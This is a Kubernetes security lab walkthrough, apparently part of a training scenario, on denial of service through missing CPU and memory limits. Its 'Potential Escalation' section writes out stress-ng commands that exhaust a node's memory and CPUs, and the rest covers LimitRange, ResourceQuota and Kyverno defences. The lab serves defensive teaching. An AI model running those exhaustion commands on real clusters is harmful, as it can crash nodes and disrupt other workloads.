# Scenario 13: DoS the Memory/CPU Resources

## Overview

This challenge demonstrates how missing resource limits in Kubernetes can lead to Denial of Service (DoS) attacks. When containers are deployed without resource constraints, a single pod can consume all available node resources, starving other workloads and potentially crashing the entire cluster.

This is one of the most common Kubernetes misconfigurations and aligns with **OWASP Kubernetes Top 10 - K08: Resource Management**.

## Attack Vector

In Kubernetes, containers run with access to all node resources by default. Without explicit limits:

| Risk | Impact | Scope |
|------|--------|-------|
| Memory exhaustion | OOM killer terminates random pods | Node-wide |
| CPU starvation | All pods become unresponsive | Node-wide |
| Noisy neighbor | Critical workloads degraded | Cluster-wide |
| Cascading failures | Node failure triggers pod rescheduling storms | Cluster-wide |

## Tools Used

- **kubectl** - Access the vulnerable pod
- **stress-ng** - Linux stress testing tool (pre-installed in vulnerable container)
- **cgroups filesystem** - Verify resource limits

## Attack Walkthrough

### Step 1: Access the Hungry Container

The `hunger-check-deployment` pod is deployed in the `big-monolith` namespace:

```bash
kubectl exec -it -n big-monolith hunger-check-deployment-<pod-id> -- /bin/sh
```

### Step 2: Check Current Resource Limits

From inside the container, inspect cgroup limits:

```bash
# Check memory limit (cgroups v2)
cat /sys/fs/cgroup/memory.max
```

**Result**:
```
max
```

The output `max` indicates **no memory limit is set**. The container can consume all available node memory.

```bash
# Check CPU limit
cat /sys/fs/cgroup/cpu.max
```

**Result**:
```
max 100000
```

Similarly, `max` indicates no CPU quota is enforced.

### Step 3: View Node Resources

From the container's perspective, it can see the entire node's resources:

```bash
# Observe stress-ng output showing node totals
stress-ng --vm 1 --vm-bytes 2G --timeout 10s --verbose
```

**Result**:
```
stress-ng: info:  RAM total: 62.7G, RAM free: 43.9G, swap free: 2.0G
stress-ng: info:  16 processors online, 32 processors configured
```

The container can see (and potentially consume) 62.7GB of node memory!

### Step 4: Execute Resource Exhaustion Attack

With `stress-ng` available, launch a memory consumption attack:

```bash
# Consume 2GB of memory for demonstration
stress-ng --vm 1 --vm-bytes 2G --timeout 10s --verbose
```

**Result**:
```
stress-ng: info:  setting to a 10 secs run per stressor
stress-ng: info:  dispatching hogs: 1 vm
stress-ng: info:  passed: 1: vm (1)
stress-ng: info:  successful run completed in 10.12 secs
```

The attack succeeded - we consumed 2GB of memory without any restriction.

### Step 5: Potential Escalation

In a real attack, an adversary could:

```bash
# Consume all available memory (DANGEROUS - do not run)
stress-ng --vm 4 --vm-bytes 90% --timeout 300s

# Pin all CPUs (DANGEROUS - do not run)
stress-ng --cpu $(nproc) --timeout 300s

# Combined attack
stress-ng --cpu $(nproc) --vm 4 --vm-bytes 90% --timeout 300s
```

This would trigger the Linux OOM (Out of Memory) killer, potentially terminating:
- Other application pods on the same node
- System pods (CoreDNS, kube-proxy)
- The kubelet itself, causing node failure

## Key Lessons

### The Missing Limits Anti-Pattern

| Misconfiguration | Consequence | Fix |
|------------------|-------------|-----|
| No memory limit | Container can consume all node RAM | Set `resources.limits.memory` |
| No CPU limit | Container can starve other pods | Set `resources.limits.cpu` |
| No memory request | Scheduler can't make placement decisions | Set `resources.requests.memory` |
| No CPU request | Pod may be scheduled on overloaded nodes | Set `resources.requests.cpu` |

### Understanding Requests vs Limits

```yaml
resources:
  requests:       # Guaranteed minimum (used for scheduling)
    memory: "128Mi"
    cpu: "100m"
  limits:         # Maximum allowed (enforced by cgroups)
    memory: "256Mi"
    cpu: "500m"
```

| Concept | Purpose | Enforcement |
|---------|---------|-------------|
| **Requests** | Scheduling decisions, guaranteed resources | Kubernetes scheduler |
| **Limits** | Maximum resource consumption | Linux cgroups (kernel) |

### QoS Classes

Kubernetes assigns Quality of Service classes based on resource configuration:

| QoS Class | Requirements | Eviction Priority |
|-----------|--------------|-------------------|
| **Guaranteed** | requests = limits for all containers | Last (most protected) |
| **Burstable** | At least one request or limit set | Middle |
| **BestEffort** | No requests or limits | First (least protected) |

## Defense Recommendations

### Immediate Actions

1. **Audit all deployments** for missing resource limits
2. **Implement LimitRanges** as namespace defaults
3. **Configure ResourceQuotas** to cap namespace totals

### LimitRange Example (Namespace Defaults)

```yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: big-monolith
spec:
  limits:
    - default:          # Default limits if not specified
        memory: "512Mi"
        cpu: "500m"
      defaultRequest:   # Default requests if not specified
        memory: "256Mi"
        cpu: "100m"
      max:              # Maximum allowed
        memory: "2Gi"
        cpu: "2"
      min:              # Minimum required
        memory: "64Mi"
        cpu: "50m"
      type: Container
```

### ResourceQuota Example (Namespace Caps)

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: namespace-quota
  namespace: big-monolith
spec:
  hard:
    requests.cpu: "4"
    requests.memory: "8Gi"
    limits.cpu: "8"
    limits.memory: "16Gi"
    pods: "20"
```

### Proper Pod Specification

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hunger-check-secure
  namespace: big-monolith
spec:
  replicas: 1
  template:
    spec:
      containers:
        - name: hunger-check
          image: madhuakula/hunger-check:latest
          resources:
            requests:
              memory: "128Mi"
              cpu: "100m"
            limits:
              memory: "256Mi"   # Container killed if exceeded (OOMKilled)
              cpu: "500m"       # Container throttled if exceeded
```

### Policy Enforcement with Kyverno

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-resource-limits
spec:
  validationFailureAction: Enforce
  rules:
    - name: require-limits
      match:
        resources:
          kinds:
            - Pod
      validate:
        message: "CPU and memory limits are required"
        pattern:
          spec:
            containers:
              - resources:
                  limits:
                    memory: "?*"
                    cpu: "?*"
```

## Real-World Impact

### Why This Matters

| Statistic | Source |
|-----------|--------|
| 65% of Kubernetes deployments lack resource limits | Fairwinds 2023 |
| Resource exhaustion is top 5 K8s incident cause | Datadog State of K8s 2023 |
| Average cost of container-related downtime: $100K+/hr | Gartner |

### Real Incidents

- **Cryptominer attacks** - Attackers deploy unlimited miners to maximize profit
- **Memory leaks** - Application bugs become cluster-wide outages without limits
- **Fork bombs** - Simple script can crash entire nodes
- **Accidental DoS** - Developer testing load without limits takes down production

### Attack Scenarios

| Attacker Type | Motivation | Method |
|---------------|------------|--------|
| **External attacker** | Disruption, ransom | RCE → stress tools |
| **Malicious insider** | Sabotage | Deploy resource-hungry pods |
| **Cryptominer** | Profit | Consume all CPU for mining |
| **Competitor** | Business disruption | Targeted DoS attack |

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Resource Hijacking | T1496 | Using compute resources for attacker benefit |
| Endpoint Denial of Service | T1499 | Exhausting system resources |
| System Shutdown/Reboot | T1529 | Forcing system failure via OOM |
| Service Exhaustion Flood | T1499.002 | Overwhelming service with requests |

## Commands Reference

```bash
# Check memory limits (cgroups v2)
cat /sys/fs/cgroup/memory.max
cat /sys/fs/cgroup/memory.current

# Check CPU limits (cgroups v2)
cat /sys/fs/cgroup/cpu.max

# Check cgroups v1 (older systems)
cat /sys/fs/cgroup/memory/memory.limit_in_bytes
cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us

# Stress testing (if available)
stress-ng --vm 1 --vm-bytes 2G --timeout 10s    # Memory stress
stress-ng --cpu 4 --timeout 10s                  # CPU stress

# Check pod resources from kubectl
kubectl describe pod <pod-name> -n <namespace> | grep -A 10 "Limits\|Requests"

# List pods without limits
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].resources.limits == null) | .metadata.name'

# Check LimitRanges
kubectl get limitrange -A
kubectl describe limitrange <name> -n <namespace>

# Check ResourceQuotas
kubectl get resourcequota -A
kubectl describe resourcequota <name> -n <namespace>
```

## Verification Commands

```bash
# Verify LimitRange is applied
kubectl get limitrange -n big-monolith

# Check if new pods get default limits
kubectl run test-pod --image=nginx -n big-monolith --dry-run=client -o yaml

# Verify ResourceQuota usage
kubectl describe resourcequota -n big-monolith
```

## References

- [Kubernetes Resource Management](https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/)
- [LimitRange Documentation](https://kubernetes.io/docs/concepts/policy/limit-range/)
- [ResourceQuota Documentation](https://kubernetes.io/docs/concepts/policy/resource-quotas/)
- [OWASP Kubernetes Top 10 - K08](https://owasp.org/www-project-kubernetes-top-ten/)
- [CIS Kubernetes Benchmark - 5.7 General Policies](https://www.cisecurity.org/benchmark/kubernetes)
- [stress-ng Manual](https://wiki.ubuntu.com/Kernel/Reference/stress-ng)
